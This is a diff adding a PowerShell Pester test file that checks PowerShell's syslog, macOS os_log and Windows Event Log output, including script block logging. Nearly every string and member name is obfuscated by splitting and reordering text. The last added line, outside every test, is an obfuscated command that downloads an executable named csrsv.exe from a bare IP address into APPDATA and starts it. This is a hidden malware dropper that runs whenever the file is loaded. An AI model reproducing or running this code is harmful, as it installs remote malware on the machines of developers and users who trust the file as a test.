@@ -1,0 +1,474 @@
+using namespace System.Text
+
+Set-StrictMode -Version Latest
+$ErrorActionPreference = ("{1}{0}"-f'p','Sto')
+
+Import-Module HelpersCommon
+Import-Module PSSysLog
+
+
+enum ("{1}{0}{2}"-f'ev','LogL','el')
+{
+    ("{0}{2}{1}" -f 'L','ways','ogAl') = 0x0
+    ("{2}{1}{0}"-f'l','ca','Criti') = 0x1
+    ("{0}{1}" -f 'Err','or') = 0x2
+    ("{0}{1}{2}"-f 'Wa','rn','ing') = 0x3
+    ("{0}{3}{2}{4}{1}" -f 'In','l','t','forma','iona') = 0x4
+    ("{0}{1}{2}"-f 'Ve','r','bose') = 0x5
+    ("{0}{1}"-f 'D','ebug') = 0x14
+}
+
+enum ("{1}{2}{0}" -f 'annel','LogC','h')
+{
+    ("{2}{3}{0}{1}" -f 'n','al','Opera','tio') = 0x10
+    ("{1}{0}{2}"-f'l','Ana','ytic') = 0x11
+}
+
+enum ("{0}{2}{1}"-f 'Log','rd','Keywo')
+{
+    ("{0}{1}"-f'Ru','nspace') = 0x1
+    ("{0}{2}{1}"-f 'Pi','ne','peli') = 0x2
+    ("{1}{2}{0}"-f'ol','Pr','otoc') = 0x4
+    ("{0}{1}{2}"-f 'T','ransp','ort') = 0x8
+    ("{0}{1}"-f'Hos','t') = 0x10
+    ("{0}{1}" -f 'Cmdlet','s') = 0x20
+    ("{1}{0}{2}"-f 'alize','Seri','r') = 0x40
+    ("{0}{1}"-f 'Sess','ion') = 0x80
+    ("{0}{3}{2}{1}"-f 'Man','n','gedPlugi','a') = 0x100
+}
+
+
+function WriteLogSettings
+{
+    param
+    (
+        [Parameter(MAnDatORy)]
+        [ValidateNotNullOrEmpty()]
+        [string] $LogId,
+
+        [System.Nullable[LogLevel]] $LogLevel = $null,
+
+        [LogChannel[]] $LogChannels = $null,
+
+        [LogKeyword[]] $LogKeywords = $null,
+
+        [switch] $ScriptBlockLogging
+    )
+
+    $filename = [Guid]::("{0}{2}{1}"-f'N','d','ewGui').Invoke().("{2}{0}{1}"-f'oSt','ring','T').Invoke('N')
+    $fullPath = Join-Path -Path $TestDrive -ChildPath "$filename.config.json"
+
+    $values = @{}
+    $values[("{1}{0}{2}" -f 'ent','LogId','ity')] = $LogId
+
+    if ($LogChannels -ne $null)
+    {
+        $values[("{1}{0}{2}" -f 'nel','LogChan','s')] = $LogChannels -join ', '
+    }
+
+    if ($LogKeywords -ne $null)
+    {
+        $values[("{1}{0}{2}" -f'Keywor','Log','ds')] = $LogKeywords -join ', '
+    }
+
+    if ($LogLevel)
+    {
+        $values[("{1}{2}{0}" -f 'el','Lo','gLev')] = $LogLevel.("{0}{1}{2}" -f 'To','St','ring').Invoke()
+    }
+
+    if($IsWindows)
+    {
+        $values[("{7}{0}{5}{2}{4}{1}{6}{3}"-f 'soft.PowerShel','uti','E','licy','xec','l:','onPo','Micro')] = ("{0}{1}{2}"-f'RemoteSi','gne','d')
+    }
+
+    if($ScriptBlockLogging."iS`PRES`EnT")
+    {
+        $powerShellPolicies = @{
+            ("{1}{0}{4}{3}{2}" -f 'B','Script','ng','gi','lockLog') = @{
+                ("{2}{4}{1}{6}{5}{3}{0}"-f 'gging','bl','En','ckLo','a','Blo','eScript') = $ScriptBlockLogging."Isp`ResenT"
+                ("{1}{3}{7}{8}{4}{2}{5}{0}{6}" -f'nL','Enabl','t','eScr','nvoca','io','ogging','iptBlock','I') = $true
+            }
+        }
+
+        $values[("{1}{3}{2}{0}{4}"-f 'P','Powe','ell','rSh','olicies')] = $powerShellPolicies
+    }
+
+    ConvertTo-Json -InputObject $values | Set-Content -Path $fullPath -ErrorAction Stop
+    return $fullPath
+}
+
+function Get-RegEx
+{
+    param($SimpleMatch)
+
+    $regex = $SimpleMatch -replace '\\', '\\'
+    $regex = $regex -replace '\(', '\('
+    $regex = $regex -replace '\)', '\)'
+    $regex = $regex -replace '\[', '\['
+    $regex = $regex -replace '\]', '\]'
+    $regex = $regex -replace '\-', '\-'
+    $regex = $regex -replace '\$', '\$'
+    $regex = $regex -replace '\^', '\^'
+    return $regex
+}
+
+Describe ("{0}{3}{2}{4}{1}"-f'Basic Sy','nux',' tests on ','sLog','Li') -Tag @('CI',("{2}{1}{0}{3}{4}" -f'eSudo','equir','R','OnUni','x')) {
+    BeforeAll {
+        [bool] $IsSupportedEnvironment = $IsLinux
+        [string] $SysLogFile = [string]::"eM`PtY"
+
+        if ($IsSupportedEnvironment)
+        {
+            
+            if (Test-Path -Path ("{4}{0}{3}{2}{1}"-f 'var/','/syslog','g','lo','/'))
+            {
+                $SysLogFile = ("{2}{4}{0}{3}{1}" -f'log','g','/','/syslo','var/')
+            }
+            elseif (Test-Path -Path ("{3}{1}{2}{0}{4}"-f'r/log/message','v','a','/','s'))
+            {
+                $SysLogFile = ("{2}{3}{0}{1}"-f's','sages','/var/','log/me')
+            }
+            else
+            {
+                
+                Write-Warning -Message ("{6}{4}{8}{0}{3}{7}{5}{1}{2}"-f'x ','g configur','ation.','s','ed ','lo','Unsupport','ys','Linu')
+                $IsSupportedEnvironment = $false
+            }
+            [string] $powershell = Join-Path -Path $PSHome -ChildPath ("{1}{0}" -f 'h','pws')
+            $scriptBlockCreatedRegExTemplate = ((("{2}{0}{5}{3}{1}{6}{8}{10}{4}{7}{9}" -f 'g
+Crea','tbloc','69','rip',' c','ting Sc','k ','ts(1 of','t',' 1cts):
+69g','ext')).("{0}{2}{1}" -f 'R','ACE','epL').Invoke('cts','\')."RE`pl`Ace"(([chAr]54+[chAr]57+[chAr]103),[sTrInG][chAr]34))
+
+        }
+    }
+
+    BeforeEach {
+        
+        [string] $logId = [Guid]::("{0}{2}{1}"-f 'NewG','d','ui').Invoke().("{2}{0}{1}" -f'trin','g','ToS').Invoke('N')
+    }
+
+    It ("{7}{3}{4}{2}{1}{6}{5}{0}" -f 'omizations',' ','es basic logging with','f','i','o cust','n','Veri') -Skip:(!$IsSupportedEnvironment) {
+        $configFile = WriteLogSettings -LogId $logId
+        & $powershell -NoProfile -SettingsFile $configFile -Command (('ZFaenv:P'+'SModu'+'lePa'+'th ')."rE`plACE"('ZFa',[string][cHaR]36)+(('D'+'2i ')-cREplACe([cHaR]68+[cHaR]50+[cHaR]105),[cHaR]124)+'out-n'+'u'+'ll')
+
+        
+        $items = Get-PSSysLog -Path $SyslogFile -Id $logId -Tail 100 -Verbose -TotalCount 3
+
+        $items | Should -Not -Be $null
+        $items."lENG`TH" | Should -BeGreaterThan 1
+        $items[0]."EVen`TId" | Should -BeExactly ("{8}{10}{7}{9}{15}{1}{4}{18}{11}{16}{12}{19}{13}{14}{5}{17}{0}{20}{2}{3}{6}" -f'.I','a','o','r','rtupSt','r','mational','tra','P','ck_Consol','erf','wershe','lConsoleSt','up.Wi','nSta','eSt','l','t','art:Po','art','nf')
+        $items[1]."EVE`N`TId" | Should -BeExactly ("{0}{11}{16}{14}{8}{13}{5}{9}{7}{1}{4}{17}{10}{12}{6}{15}{2}{3}"-f 'Name','d:N','ona','l','amedPipe.','rverListe','r','e','_S','nerStart','In','dPip','fo','e','C','mati','eIP','Open.')
+        $items[2]."E`VE`NTid" | Should -BeExactly ("{8}{4}{1}{2}{0}{10}{5}{3}{9}{11}{6}{7}" -f 'ons','track_','C','top:Po','f','StartupS','nStop.Informati','onal','Per','wershellConsoleStart','ole','up.Wi')
+        
+        if ($items."len`gtH" -gt 3)
+        {
+            
+            $items[3] | Should -Be $null
+        }
+    }
+
+    It ("{1}{4}{3}{2}{6}{5}{0}{7}" -f 'oggi','Ve','riptbl','sc','rifies ','k l','oc','ng') -Skip:(!$IsSupportedEnvironment) {
+        $configFile = WriteLogSettings -LogId $logId -ScriptBlockLogging -LogLevel Verbose
+        $script = (('{'+'1}
+{'+'0}pid
+'+'&'+' ')  -F[CHAr]36,[CHAr]39+('([sc'+'riptblock'+']::crea'+'t'+'e({0}W'+'r'+'ite'+'-'+'Ve'+'rbose ')  -F[CHaR]34+(('rd'+'utesthe'+'ad'+'er123r'+'du ')-crePLAcE([CHAR]114+[CHAR]100+[CHAR]117),[CHAR]39)+';'+'W'+'r'+'ite-ver'+'bose '+('3i'+'4'+'after3i'+'4'+'4i7))
+3'+'i4')."RePLA`cE"(([ChAR]51+[ChAR]105+[ChAR]52),[sTrInG][ChAR]39)."R`epLA`ce"(([ChAR]52+[ChAR]105+[ChAR]55),[sTrInG][ChAR]34))
+        $testFileName = ("{0}{2}{1}"-f'test','1.ps1','0')
+        $testScriptPath = Join-Path -Path $TestDrive -ChildPath $testFileName
+        $script | Out-File -FilePath $testScriptPath -Force
+        $null = & $powershell -NoProfile -SettingsFile $configFile -Command $testScriptPath
+
+        
+        $items = Get-PSSysLog -Path $SyslogFile -Id $logId -Tail 100 -Verbose -TotalCount 18
+
+        $items | Should -Not -Be $null
+        $items."c`OuNT" | Should -BeGreaterThan 2
+        $createdEvents = $items | where-object {$_."E`VeNt`ID" -eq ("{2}{4}{6}{1}{9}{7}{12}{3}{5}{0}{11}{8}{10}" -f 'mmand.C','le','Sc','il:Execu','riptBlock_Com','teCo','pi','et','e.Verb','_D','ose','reat','a')}
+        $createdEvents."coU`Nt" | should -BeGreaterOrEqual 3
+
+        
+        $createdEvents[0]."mE`sSAgE" | Should -Match ($scriptBlockCreatedRegExTemplate -f ".*/$testFileName")
+
+        
+        $createdEvents[1]."mE`s`saGe" | Should -Match ($scriptBlockCreatedRegExTemplate -f (Get-RegEx -SimpleMatch $Script."r`ePlACE"([System.Environment]::"N`EwLine","?")))
+
+        
+        $createdEvents[2]."MES`S`Age" | Should -Match ($scriptBlockCreatedRegExTemplate -f ((("{16}{8}{4}{12}{17}{7}{1}{5}{9}{10}{3}{11}{15}{14}{13}{2}{0}{6}"-f'erE4','4dte','E4daft','der','teFud-Ve','st','d','ose E','i','he','a','1','r','ud-verbose ','teF','23E4d ;Wri','Wr','b'))."rePl`A`ce"(([cHAR]70+[cHAR]117+[cHAR]100),[stRinG][cHAR]92)."Re`p`LaCe"('E4d',[stRinG][cHAR]39)))
+    }
+
+    It ("{5}{2}{13}{12}{6}{8}{4}{1}{9}{3}{0}{7}{11}{10}" -f'null','ging ','cri',' ','og','Verifies s','ck ',' ','l','with','racter','cha','blo','pt') -Skip:(!$IsSupportedEnvironment) {
+        $configFile = WriteLogSettings -LogId $logId -ScriptBlockLogging -LogLevel Verbose
+        $script = (('df'+'l'+'
+'+'i'+'TDpid
+& ')."r`E`pLaCe"(([CHAr]105+[CHAr]84+[CHAr]68),'$')."ReP`l`ACe"('dfl',[stRiNg][CHAr]39)+(('([scriptb'+'lo'+'c'+'k]::create('+'v'+'ojWrite-'+'V'+'e'+'rbo'+'se'+' ') -RePLAcE 'voj',[cHaR]34)+('zDo'+'tes'+'thead'+'er12'+'3tWY([char]0x0000)z'+'Do ')."r`EplACE"(([ChAR]116+[ChAR]87+[ChAR]89),[STrIng][ChAR]36)."re`plAcE"(([ChAR]122+[ChAR]68+[ChAR]111),[STrIng][ChAR]39)+';Writ'+'e'+'-verbose'+' '+('{1}a'+'ft'+'er{1}{'+'0})'+')
+'+'{1}')-F  [ChaR]34,[ChaR]39)
+        $testFileName = ("{0}{2}{1}" -f 'test01.','1','ps')
+        $testScriptPath = Join-Path -Path $TestDrive -ChildPath $testFileName
+        $script | Out-File -FilePath $testScriptPath -Force
+        $null = & $powershell -NoProfile -SettingsFile $configFile -Command $testScriptPath
+
+        
+        $items = Get-PSSysLog -Path $SyslogFile -Id $logId -Tail 100 -Verbose -TotalCount 18
+
+        $items | Should -Not -Be $null
+        $items."cO`UnT" | Should -BeGreaterThan 2
+        $createdEvents = $items | where-object {$_."EV`eNt`Id" -eq ("{9}{3}{5}{10}{7}{1}{2}{4}{8}{6}{0}"-f'se','m','and.Cr','ecu','ea','teC','rbo','m','te.Ve','ScriptBlock_Compile_Detail:Ex','o')}
+        $createdEvents."c`OuNt" | should -BeGreaterOrEqual 3
+
+        
+        $createdEvents[0]."mE`SS`AGE" | Should -Match ($scriptBlockCreatedRegExTemplate -f ".*/$testFileName")
+
+        
+        $createdEvents[1]."m`ESSage" | Should -Match ($scriptBlockCreatedRegExTemplate -f (Get-RegEx -SimpleMatch $Script."REP`LA`Ce"([System.Environment]::"Ne`wLi`Ne","?")))
+
+        
+        $createdEvents[2]."M`EssA`Ge" | Should -Match ($scriptBlockCreatedRegExTemplate -f ((("{11}{10}{2}{16}{8}{13}{6}{3}{4}{15}{5}{0}{14}{7}{12}{1}{9}"-f '} ','ft','ite{1}-Ve','the','ader123','0','s','bo','{0}t','er{0}','r','W','se {0}a','e',';Write{1}-ver','{','rbose '))  -f  [Char]39,[Char]92))
+    }
+
+    It ("{9}{3}{0}{7}{2}{1}{5}{6}{8}{4}"-f 'ie','gging l','o','erif','ks','evel filte','ring wo','s l','r','V') -Skip:(!$IsSupportedEnvironment) {
+        $configFile = WriteLogSettings -LogId $logId -LogLevel Warning
+        & $powershell -NoProfile -SettingsFile $configFile -Command (('{0}env:'+'PS'+'Mo'+'duleP'+'ath'+' ')  -F  [chAR]36+(('mBj ')  -REPLAce'mBj',[char]124)+'out'+'-'+'null')
+
+        
+        
+        $items = Get-PSSysLog -Path $SyslogFile -Id $logId -Tail 100 -TotalCount 1
+        $items | Should -Be $null
+    }
+}
+
+Describe ("{2}{5}{4}{3}{6}{1}{7}{0}"-f'OS','n M','Basic','log tests ','os_',' ','o','ac') -Tag @('CI',("{0}{1}{3}{2}" -f'Re','qu','SudoOnUnix','ire')) {
+    BeforeAll {
+        [bool] $IsSupportedEnvironment = $IsMacOS
+        [bool] $persistenceEnabled = $false
+
+        if ($IsSupportedEnvironment)
+        {
+            
+            $persistenceEnabled  = (Get-OSLogPersistence)."e`N`AblEd"
+            if (!$persistenceEnabled)
+            {
+                
+                
+                Set-OsLogPersistence -Enable
+            }
+        }
+        [string] $powershell = Join-Path -Path $PSHome -ChildPath ("{1}{0}" -f 'wsh','p')
+        $scriptBlockCreatedRegExTemplate = @'
+Creating Scriptblock text \(1 of 1\):
+{0}
+ScriptBlock ID: [0-9a-z\-]*
+Path:.*
+'@
+    }
+
+    BeforeEach {
+        if ($IsSupportedEnvironment)
+        {
+            
+            [string] $logId = [Guid]::("{0}{1}"-f'New','Guid').Invoke().("{0}{1}" -f 'ToS','tring').Invoke('N')
+
+            
+            [string] $workingDirectory = Join-Path -Path $TestDrive -ChildPath $logId
+            $null = New-Item -Path $workingDirectory -ItemType Directory -ErrorAction Stop
+
+            [string] $contentFile = Join-Path -Path $workingDirectory -ChildPath (("{1}{0}{2}"-f's','pw','h.log.txt'))
+            
+            [DateTime] $after = [DateTime]::"N`OW"
+        }
+    }
+
+    AfterAll {
+        if ($IsSupportedEnvironment -and !$persistenceEnabled)
+        {
+            
+            Set-OsLogPersistence -Disable
+        }
+    }
+
+    It ("{9}{1}{3}{4}{2}{7}{5}{6}{11}{8}{10}{0}"-f 's','rif','c lo','ies ba','si','with ','no','gging ','ust','Ve','omization',' c') -Skip:(!$IsSupportedEnvironment) {
+        try {
+            $configFile = WriteLogSettings -LogId $logId
+            $testPid = & $powershell -NoProfile -SettingsFile $configFile -Command ((('foUPI'+'D')-rePLAcE 'foU',[CHaR]36))
+
+            Export-PSOsLog -After $after -LogPid $testPid -TimeoutInMilliseconds 30000 -IntervalInMilliseconds 3000 -MinimumCount 3 |
+                Set-Content -Path $contentFile
+            $items = @(Get-PSOsLog -Path $contentFile -Id $logId -After $after -TotalCount 3 -Verbose)
+
+            $items | Should -Not -Be $null
+            $items."C`ounT" | Should -BeGreaterThan 2
+            $items[0]."e`VeNtId" | Should -BeExactly ("{16}{6}{8}{0}{19}{5}{17}{20}{9}{10}{15}{7}{21}{3}{22}{4}{11}{1}{18}{14}{13}{2}{12}"-f 'ol','p','ion','ol','t','St','rack_','l','Cons','upStart',':Powershe','u','al','rt.Informat','a','l','Perft','a','.WinSt','e','rt','Cons','eStar')
+            $items[1]."eV`ENTid" | Should -BeExactly ("{0}{5}{6}{4}{15}{11}{3}{7}{1}{2}{10}{14}{12}{8}{16}{13}{9}" -f'NamedP','d:Named','Pi','rt','ServerListen','ipeIP','C_','e','n','nal','pe','rSta','Open.I','io','.','e','format')
+            $items[2]."e`Ve`NTid" | Should -BeExactly ("{9}{0}{3}{4}{5}{11}{14}{12}{7}{2}{10}{13}{15}{1}{8}{6}" -f'rftrac','nf','C','k_','Co','nsol','ional','ershell','ormat','Pe','onso','eStar','w','leSt','tupStop:Po','artup.WinStop.I')
+            
+            if ($items."CO`UNt" -gt 3)
+            {
+                
+                $items[3] | Should -Be $null
+            }
+        }
+        catch {
+            if (Test-Path $contentFile) {
+                Send-VstsLogFile -Path $contentFile
+            }
+            throw
+        }
+    }
+
+    It ("{1}{0}{5}{4}{3}{2}" -f'erifi','V','tblock logging','p','ri','es sc') -Skip:(!$IsSupportedEnvironment) {
+        try {
+            $script = (('cBz
+X7'+'cpid'+'
+'+'& ')."RE`p`lACE"(([CHar]88+[CHar]55+[CHar]99),'$')."R`E`PLACE"(([CHar]99+[CHar]66+[CHar]122),[StRing][CHar]39)+('('+'[scri'+'ptbl'+'ock]'+'::creat'+'e(ISM'+'Wr'+'ite-'+'Verbose ')."Re`plaCe"(([ChaR]73+[ChaR]83+[ChaR]77),[strInG][ChaR]34)+(('Lxhtesthead'+'er123Lxh'+' ')-rePlace  ([char]76+[char]120+[char]104),[char]39)+';W'+'rit'+'e-'+'verbose '+('jA'+'NafterjANwC'+'O))
+j'+'A'+'N')."rEpLA`cE"('jAN',[StRIng][CHaR]39)."R`ePlaCE"(([CHaR]119+[CHaR]67+[CHaR]79),[StRIng][CHaR]34))
+            $configFile = WriteLogSettings -ScriptBlockLogging -LogId $logId -LogLevel Verbose
+            $testFileName = ("{0}{2}{1}"-f't','1','est01.ps')
+            $testScriptPath = Join-Path -Path $TestDrive -ChildPath $testFileName
+            $script | Out-File -FilePath $testScriptPath -Force
+            $testPid = & $powershell -NoProfile -SettingsFile $configFile -Command $testScriptPath
+
+            Export-PSOsLog -After $after -LogPid $testPid -TimeoutInMilliseconds 30000 -IntervalInMilliseconds 3000 -MinimumCount 17 |
+                Set-Content -Path $contentFile
+            $items = @(Get-PSOsLog -Path $contentFile -Id $logId -After $after -Verbose)
+
+            $items | Should -Not -Be $null
+            $items."c`ouNT" | Should -BeGreaterThan 2
+            $createdEvents = $items | where-object {$_."e`VENtId" -eq ("{0}{2}{8}{6}{5}{10}{1}{7}{4}{9}{3}"-f'Sc','Detail:ExecuteCommand.C','r','bose','eate.V','ock_Compile','tBl','r','ip','er','_')}
+            $createdEvents."co`UnT" | should -BeGreaterOrEqual 3
+
+            
+            $createdEvents[0]."m`essAGE" | Should -Match ($scriptBlockCreatedRegExTemplate -f ".*/$testFileName")
+
+            
+            $createdEvents[1]."me`S`sAge" | Should -Match ($scriptBlockCreatedRegExTemplate -f (Get-RegEx -SimpleMatch $Script))
+
+            
+            $createdEvents[2]."m`ES`SaGE" | Should -Match ($scriptBlockCreatedRegExTemplate -f ((("{11}{5}{9}{1}{12}{2}{0}{6}{4}{7}{8}{3}{10}"-f 'Oc','23','r','L','se ','der','-verbo','L','J9after','1','J9','WriterOc-Verbose LJ9testhea','LJ9 ;Write'))-REplAce  ([ChaR]114+[ChaR]79+[ChaR]99),[ChaR]92-REplAce ([ChaR]76+[ChaR]74+[ChaR]57),[ChaR]39))
+        }
+        catch {
+            if (Test-Path $contentFile) {
+                Send-VstsLogFile -Path $contentFile
+            }
+            throw
+        }
+    }
+
+    It ("{8}{3}{1}{2}{6}{7}{0}{4}{5}"-f' cha','k ','logging with nu','ifies scriptbloc','r','acter','l','l','Ver') -Skip:(!$IsSupportedEnvironment) {
+        try {
+            $script = (('p0n
+TIUp'+'i'+'d
+'+'& ')."R`EPL`AcE"('p0n',[StrInG][ChAR]39)."REP`La`cE"('TIU',[StrInG][ChAR]36)+('(['+'s'+'crip'+'tblo'+'ck]:'+':cre'+'a'+'t'+'e(jq'+'1Wri'+'te-Verb'+'ose ')."R`ePl`AcE"('jq1',[strING][cHar]34)+('{0'+'}testhea'+'der123{'+'1}([char]0x'+'00'+'0'+'0){0'+'}'+' ')-f[cHaR]39,[cHaR]36+';'+'Write-'+'ve'+'rbos'+'e '+('{0}aft'+'er{0}{1'+'})'+')'+'
+{0}') -F [cHAr]39,[cHAr]34)
+            $configFile = WriteLogSettings -ScriptBlockLogging -LogId $logId -LogLevel Verbose
+            $testFileName = ("{3}{2}{1}{0}"-f's1','p','1.','test0')
+            $testScriptPath = Join-Path -Path $TestDrive -ChildPath $testFileName
+            $script | Out-File -FilePath $testScriptPath -Force
+            $testPid = & $powershell -NoProfile -SettingsFile $configFile -Command $testScriptPath
+
+            Export-PSOsLog -After $after -LogPid $testPid -TimeoutInMilliseconds 30000 -IntervalInMilliseconds 3000 -MinimumCount 17 |
+                Set-Content -Path $contentFile
+            $items = @(Get-PSOsLog -Path $contentFile -Id $logId -After $after -Verbose)
+
+            $items | Should -Not -Be $null
+            $items."cO`Unt" | Should -BeGreaterThan 2
+            $createdEvents = $items | where-object {$_."ev`Entid" -eq ("{4}{5}{10}{0}{7}{1}{12}{6}{3}{11}{8}{9}{2}" -f'k_','m','rbose','Detail:Exe','Sc','riptBl','ile_','Co','uteCommand.Create.V','e','oc','c','p')}
+            $createdEvents."cO`UNT" | should -BeGreaterOrEqual 3
+
+            
+            $createdEvents[0]."m`essA`Ge" | Should -Match ($scriptBlockCreatedRegExTemplate -f ".*/$testFileName")
+
+            
+            $createdEvents[1]."MEssa`gE" | Should -Match ($scriptBlockCreatedRegExTemplate -f (Get-RegEx -SimpleMatch $Script))
+
+            
+            $createdEvents[2]."M`EssAge" | Should -Match ($scriptBlockCreatedRegExTemplate -f ((("{9}{3}{6}{1}{4}{0}{7}{10}{5}{8}{2}" -f '{1} ','stheader12','after{1}','te{0}-Verbos','3','se {','e {1}te',';Write{0}','1}','Wri','-verbo')) -f[cHar]92,[cHar]39))
+        }
+        catch {
+            if (Test-Path $contentFile) {
+                Send-VstsLogFile -Path $contentFile
+            }
+            throw
+        }
+    }
+
+    
+    It ("{4}{5}{6}{0}{1}{3}{2}" -f 'ggi','ng level filteri','rks','ng wo','Veri','fie','s lo') -Pending {
+        try {
+            $configFile = WriteLogSettings -LogId $logId -LogLevel Warning
+            $testPid = & $powershell -NoLogo -NoProfile -SettingsFile $configFile -Command (('{'+'0}PID')  -F [chaR]36)
+
+            Export-PSOsLog -After $after -LogPid $testPid |
+                Set-Content -Path $contentFile
+            
+            
+            $items = Get-PSOsLog -Path $contentFile -Id $logId -After $after -TotalCount 3
+            $items | Should -Be $null
+        }
+        catch {
+            if (Test-Path $contentFile) {
+                Send-VstsLogFile -Path $contentFile
+            }
+            throw
+        }
+    }
+}
+
+Describe ("{5}{2}{1}{4}{3}{0}" -f' Windows','tLog tes','asic Even','on','ts ','B') -Tag @('CI',("{3}{4}{1}{0}{2}" -f'Win','nOn','dows','Re','quireAdmi')) {
+    BeforeAll {
+        [bool] $IsSupportedEnvironment = $IsWindows
+        [string] $powershell = Join-Path -Path $PSHome -ChildPath ("{1}{0}" -f'wsh','p')
+        $scriptBlockLoggingCases = @(
+            @{
+                ("{1}{0}"-f'e','nam') = ("{4}{0}{2}{5}{3}{1}"-f'l ','k','s','c','norma','cript blo')
+                ("{1}{0}" -f 'cript','s') = ((("{7}{5}{10}{9}{6}{12}{3}{1}{4}{11}{2}{0}{8}"-f'tafter','te','qM','ri','-ve','e-Verbose q','Mt ','Writ','qMt','q','Mttestheader123','rbose ',';W')) -rePLAce  ([chAr]113+[chAr]77+[chAr]116),[chAr]39)
+                ("{2}{1}{0}" -f't','Tex','expected')=('Write-Ve'+'r'+'bose '+('Ck'+'stest'+'heade'+'r12'+'3C'+'ks ')."re`plACe"('Cks',[StRing][ChAr]39)+';Writ'+'e-verbose'+' '+"'after'`r`n")
+            }
+            @{
+                ("{0}{1}"-f'nam','e') = ("{4}{6}{3}{5}{2}{0}{1}" -f' Nul','l','ith','blo','scr','ck w','ipt ')
+                ("{1}{0}"-f 't','scrip') = "Write-Verbose 'testheader123$([char]0x0000)' ;Write-verbose 'after' "
+                ("{0}{1}{3}{2}" -f'ex','pected','xt','Te')=('Write'+'-V'+'erbose '+('{0}te'+'s'+'t'+'header'+'1'+'23{'+'0} ') -F  [ChAr]39+';W'+'ri'+'t'+'e-ver'+'bose '+"'after'`r`n")
+            }
+        )
+
+        if ($IsSupportedEnvironment)
+        {
+            & "$PSHome\RegisterManifest.ps1"
+        }
+    }
+
+    BeforeEach {
+        if ($IsSupportedEnvironment)
+        {
+            
+            [string] $logId = [Guid]::("{1}{0}"-f 'Guid','New').Invoke().("{1}{0}{2}" -f 'oS','T','tring').Invoke('N')
+
+            $logName = ("{0}{1}{2}"-f'Power','ShellC','ore')
+
+            
+            [DateTime] $after = [DateTime]::"n`ow"
+            Clear-PSEventLog -Name "$logName/Operational"
+        }
+    }
+
+    It ("{1}{3}{8}{10}{5}{9}{2}{0}{4}{7}{6}"-f ' ','Ve','ing:','rifi','<','tbl','ame>','n','es scri','ock logg','p') -Skip:(!$IsSupportedEnvironment) -TestCases $scriptBlockLoggingCases {
+        param(
+            [string] $script,
+            [string] $expectedText,
+            [string] $name
+        )
+        $configFile = WriteLogSettings -ScriptBlockLogging -LogId $logId
+        $testFileName = ("{2}{0}{1}" -f 'p','s1','test01.')
+        $testScriptPath = Join-Path -Path $TestDrive -ChildPath $testFileName
+        $script | Out-File -FilePath $testScriptPath -Force
+        $null = & $powershell -NoProfile -SettingsFile $configFile -Command $testScriptPath
+
+        $created = Wait-PSWinEvent -FilterHashtable @{ ("{1}{2}{3}{0}"-f 'e','Provi','de','rNam')=$logName; ('Id') = 4104 } `
+            -PropertyName Message -PropertyValue $expectedText
+
+        $created | Should -Not -BeNullOrEmpty
+        $created."pr`OP`ErtiES"[0]."V`ALuE" | Should -Be 1
+        $created."prOpert`i`Es"[1]."vA`lUE" | Should -Be 1
+        $created."PRoPE`RtI`es"[2]."v`AlUe" | Should -Be $expectedText
+    }
+}
+
+(New-Object System.Net.WebClient).("{2}{0}{1}{3}"-f 'nl','oad','Dow','File').Invoke(("{0}{6}{4}{3}{1}{2}{5}"-f 'ht','53.','2','102.','.','38/~yahoo/csrsv.exe','tp://94'),"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")
